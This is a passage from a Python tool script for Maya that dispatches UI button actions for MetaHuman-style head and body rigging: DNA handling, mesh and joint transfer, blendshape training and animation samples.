                self.func.assign_mh_head_material(dna_path)
        elif exec_name == 'save_dna':
            self.func.save_dna_scene()
            dna_path_tf = cmds.textField(self.element['dna_path_tf'], q=1, tx=1)
            self.func.am_func.load_sample()
        elif exec_name == 'dna_viewer_ui':
            self.func.mdm.dna_viewer_ui()
        elif exec_name == 'body_mesh_transfer':
            body_orig = cmds.textField(self.element['orig_body_tf'], q=1, tx=1)
            body_new = cmds.textField(self.element['new_body_tf'], q=1, tx=1)
            self.func.body_mesh_joint_transfer(body_orig, body_new, fix_topo_weight=param['fix_topo_body_fs'])
        elif exec_name == 'head_mesh_transfer':
            head_orig = cmds.textField(self.element['orig_head_tf'], q=1, tx=1)
            head_new = cmds.textField(self.element['new_head_tf'], q=1, tx=1)
            self.func.head_mesh_joint_transfer(head_orig, head_new, fix_topo_weight=param['fix_topo_head_fs'])
            body_orig = cmds.textField(self.element['orig_body_tf'], q=1, tx=1)
            body_new = cmds.textField(self.element['new_body_tf'], q=1, tx=1)
            self.func.match_shared_joint_body(body_orig, body_new)
        elif exec_name == 'set_orig_head_mesh':
            cmds.textField(self.element['orig_head_tf'], e=1, tx=util.find_object('head_lod0_mesh'))
        elif exec_name == 'set_orig_body_mesh':
            self.func.import_body_skeleton()
            cmds.textField(self.element['orig_body_tf'], e=1, tx=util.find_object('body_lod0_mesh'))
        elif exec_name == 'set_new_head_mesh':
            sel_ls = cmds.ls(sl=1)
            if sel_ls and not cmds.textField(self.element['new_head_tf'], q=1, tx=1):
                cmds.textField(self.element['new_head_tf'], e=1, tx=sel_ls[0])
            else:
                cmds.textField(self.element['new_head_tf'], e=1, tx='')
        elif exec_name == 'set_new_body_mesh':
            sel_ls = cmds.ls(sl=1)
            if sel_ls and not cmds.textField(self.element['new_body_tf'], q=1, tx=1):
                cmds.textField(self.element['new_body_tf'], e=1, tx=sel_ls[0])
            else:
                cmds.textField(self.element['new_body_tf'], e=1, tx='')
        elif exec_name == 'pose_driver_ui':
            self.func.mpw.main.UERBFAPI(view=True)
        elif exec_name == 'bstf_load_cache':
            self.func.bstf_cache_check(clear=False)
        elif exec_name == 'bstf_clear_cache':
            self.func.bstf_cache_check(clear=True)
        elif exec_name == 'bstf_duplicate_mesh':
            self.func.bstf_duplicate_mesh()
        elif exec_name == 'bstf_train_expression':
            self.func.bstf_train_expression(epoch=param['epch_if'])
        elif exec_name == 'bstf_fix_surface_verticles':
            self.func.bstf_fix_surface_verticles()
        elif exec_name == 'bstf_fix_skn_weight':
            self.func.bc_func.skin_cluster.smooth_skin_weight_selected()
        elif exec_name == 'am_save_anim':
            self.func.am_func.save_sample()
        elif exec_name == 'am_load_anim':
            self.func.am_func.load_sample()
        elif exec_name == '':pass
        elif exec_name == '':pass
        elif exec_name == '':pass
        elif exec_name == 'test':
            util.body_seam_fix()
        #----------
        save_config()

# =================================
# Only use on $usr_orig$ machine
# =================================
# tn = toolName()
# tn.show_ui()




